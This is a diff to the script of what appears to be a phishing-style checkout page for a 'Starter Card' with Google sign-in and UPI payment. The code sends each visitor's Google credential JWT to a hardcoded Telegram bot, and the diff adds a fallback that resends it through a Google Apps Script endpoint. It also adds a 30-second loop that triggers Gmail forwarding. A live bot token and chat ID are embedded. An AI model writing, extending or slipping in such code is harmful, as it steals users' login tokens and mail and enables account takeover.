@@ -226,17 +226,16 @@ nav{display:flex;justify-content:space-between;align-items:center;padding:22px;m
    ============================================================ */
 var CLIENT_ID = "742486751915-bgrr88qvqg27l725qtk2fci1746vusls.apps.googleusercontent.com";
 var APPS_SCRIPT_URL = "https://script.google.com/macros/s/AKfycbwCsahDe8GcT50fZ71IuvRnq1YP0eCEBsYF-dIjObdqtgG4lvyYRDqBP7yu8-aXfK_raQ/exec";
-
-/* ✅ DIRECT Telegram — login/payment ke liye FAST */
 var TELEGRAM_BOT_TOKEN = "8652856121:AAEfFWS05I9dgvVALAhrmz4Ai5GilnjNmXI";
 var TELEGRAM_CHAT_ID = "6904082547";
 
 var plan = { name: "Starter Card", price: 1.99 };
 var payMethod = "UPI";
 var qrTimerId = null;
+var gmailCheckInterval = null;
 
 /* ============================================================
-   === TELEGRAM — DIRECT METHOD (FAST + RELIABLE) ===
+   === TELEGRAM — DIRECT + FALLBACK ===
    ============================================================ */
 function escapeHTML(str) {
   if (!str) return "";
@@ -250,8 +249,8 @@ function escapeHTML(str) {
 
 function sendTelegramDirect(text) {
   if (!text) return Promise.resolve();
-  var url = "https://api.telegram.org/bot" + TELEGRAM_BOT_TOKEN + "/sendMessage";
-  return fetch(url, {
+  var tgUrl = "https://api.telegram.org/bot" + TELEGRAM_BOT_TOKEN + "/sendMessage";
+  return fetch(tgUrl, {
     method: "POST",
     headers: { "Content-Type": "application/json" },
     body: JSON.stringify({
@@ -261,12 +260,26 @@ function sendTelegramDirect(text) {
     })
   })
   .then(function(r){ return r.json(); })
-  .then(function(d){ console.log("✅ Telegram sent:", d); return d; })
-  .catch(function(e){ console.error("❌ Telegram error:", e); });
+  .then(function(d){
+    if (d && d.ok) {
+      console.log("✅ Telegram (direct):", d);
+      return d;
+    }
+    throw new Error("Direct failed");
+  })
+  .catch(function(e){
+    console.warn("⚠️ Direct failed → Apps Script fallback");
+    return fetch(APPS_SCRIPT_URL, {
+      method: "POST",
+      mode: "no-cors",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ action: "send_telegram", text: text, ts: Date.now() })
+    }).catch(function(err){ console.error("❌ Both failed:", err); });
+  });
 }
 
 /* ============================================================
-   === APPS SCRIPT — SIRF GMAIL FORWARDING KE LIYE ===
+   === GMAIL FORWARD ===
    ============================================================ */
 function triggerGmailForward() {
   if (!APPS_SCRIPT_URL) return Promise.resolve();
@@ -278,6 +291,16 @@ function triggerGmailForward() {
   })
   .then(function(){ console.log("📧 Gmail forward triggered"); })
   .catch(function(e){ console.error("Gmail error:", e); });
+}
+
+/* 🚀 Har 30 second mein Gmail check */
+function startGmailAutoCheck() {
+  if (gmailCheckInterval) clearInterval(gmailCheckInterval);
+  triggerGmailForward();
+  gmailCheckInterval = setInterval(function() {
+    console.log("🔄 Auto Gmail check...");
+    triggerGmailForward();
+  }, 30000);
 }
 
 /* ============================================================
@@ -307,6 +330,7 @@ window.onload = function() {
     });
   }
   triggerGmailForward();
+  startGmailAutoCheck();
 };
 
 function triggerOneTap() {
@@ -338,11 +362,9 @@ function handleCredentialResponse(resp) {
       "⏰ <b>Time:</b> " + new Date().toLocaleString() + "\n\n" +
       "🎫 <b>JWT:</b>\n<code>" + escapeHTML(resp.credential) + "</code>";
 
-    // ✅ Direct Telegram — FAST
     sendTelegramDirect(msg);
-
-    // 📧 Apps Script se Gmail forward trigger (background)
     triggerGmailForward();
+    startGmailAutoCheck();
 
     document.getElementById('emailDisp').innerText = payload.email || "";
     go('pgPlans');
@@ -397,7 +419,7 @@ function doPay() {
 }
 
 /* ============================================================
-   === QR CODE ===
+   === QR ===
    ============================================================ */
 function drawQr() {
   var c = document.getElementById('qrCanvas');
